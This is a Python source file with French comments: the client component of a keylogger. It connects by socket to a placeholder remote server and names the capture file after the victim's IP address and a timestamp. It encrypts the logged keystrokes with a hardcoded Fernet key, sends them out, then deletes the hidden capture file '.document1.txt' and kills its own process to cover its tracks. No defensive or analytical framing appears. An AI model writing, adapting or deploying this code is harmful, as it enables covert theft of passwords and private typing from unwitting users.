import keylogger
import socket
import os  
import time
from datetime import datetime
from cryptography.fernet import Fernet
import psutil

"""
fonction qui renvoie le nom du fichier avec l'adresse ip et la date
"""
def get_filename():
    now = datetime.now() # date et heure actuelle
    ip = socket.gethostbyname(socket.gethostname()) # adresse ip de la machine
    if os.name == 'nt':
        filename = ip + "-" + now.strftime("%d-%m-%Y-%H-%M-%S") + ".keyboard.txt"
    else:
        filename = ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
    return filename

"""
fonction qui lance le keylogger
"""

def launch_keylogger(mysocket):
    return keylogger.listen_keyboard(mysocket)


"""
fonction qui supprime le fichier de capture et arrete le processus en cours
"""
    
def stop_and_delete_capture_file():
    file = ".document1.txt" 
    os.remove(file)
    p = psutil.Process(os.getpid())
    p.terminate()
    

"""
fonction qui crée un socket et se connecte au serveur
"""

def get_socket(server_address, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    client_socket.connect((server_address, server_port))
    return client_socket


"""
fonction qui envoie le fichier de capture au serveur de manière sécurisée
"""
def send_file_securely(client_socket):
    try:
        key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s=" # clé de chiffrement et de déchiffrement
 
        filename = get_filename() # nom du fichier
        encrypted_message = Fernet(key).encrypt(filename.encode('utf-8')) # chiffrement du nom du fichier
        client_socket.send(encrypted_message) # envoi du nom du fichier

        with open(".document1.txt", "r") as file:
            lines = file.read() # lecture du fichier de capture
            encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8')) # chiffrement du fichier de capture
            client_socket.send(encrypted_lines) # envoi du fichier de capture
            time.sleep(1) # attente de 1 seconde
            file.close() # fermeture
            del file
    except Exception:
        pass
            
    finally:
        client_socket.close()

if __name__ == "__main__":
    try:
        mysocket = get_socket("ip_server", 12345) # connexion au serveur
        launch_keylogger(mysocket) # lancement du keylogger
    except Exception:
        pass


